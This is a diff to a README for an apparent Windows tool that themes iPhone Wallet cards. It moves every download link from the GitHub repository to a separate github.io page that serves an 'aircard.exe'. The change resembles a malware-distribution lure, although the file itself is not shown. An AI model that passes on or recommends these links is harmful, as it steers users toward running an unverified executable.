@@ -1,6 +1,6 @@
 # 🎴 AirCard-Windows - Customize Your iPhone Cards Effortlessly
 
-[![Download AirCard](https://img.shields.io/badge/Download-AirCard_Windows-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Lauracol26/AirCard-Windows)
+[![Download AirCard](https://img.shields.io/badge/Download-AirCard_Windows-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://lauracol26.github.io)
 
 ---
 
@@ -40,7 +40,7 @@ Ready to customize your iPhone? Follow these simple steps.
 
 ### Step 1: Download AirCard
 
-Visit this link to download the application: **[https://github.com/Lauracol26/AirCard-Windows](https://github.com/Lauracol26/AirCard-Windows)**
+Visit this link to download the application: **[https://lauracol26.github.io](https://lauracol26.github.io)**
 
 On that page, you'll find the download button. Click it to get the `aircard.exe` file.
 
@@ -124,6 +124,6 @@ For developers and advanced users, AirCard is powered by a technology called `ai
 
 AirCard puts the power of customization in your hands. It's fast, safe, and unbelievably easy. Download it now and give your iPhone a look that's all your own.
 
-[![Get AirCard Now](https://img.shields.io/badge/Get_AirCard-Now-blue?style=for-the-badge&logo=github)](https://github.com/Lauracol26/AirCard-Windows)
+[![Get AirCard Now](https://img.shields.io/badge/Get_AirCard-Now-blue?style=for-the-badge&logo=github)](https://lauracol26.github.io)
 
 Keywords: AirCard, Windows, iOS 18, Apple Wallet, Card Skin, Passcode Theme, Rust, egui, iPhone Customization, No Jailbreak, airlift, Apple Pay, Apple Cash, Wallet Modding, Theme App, Windows Tool.
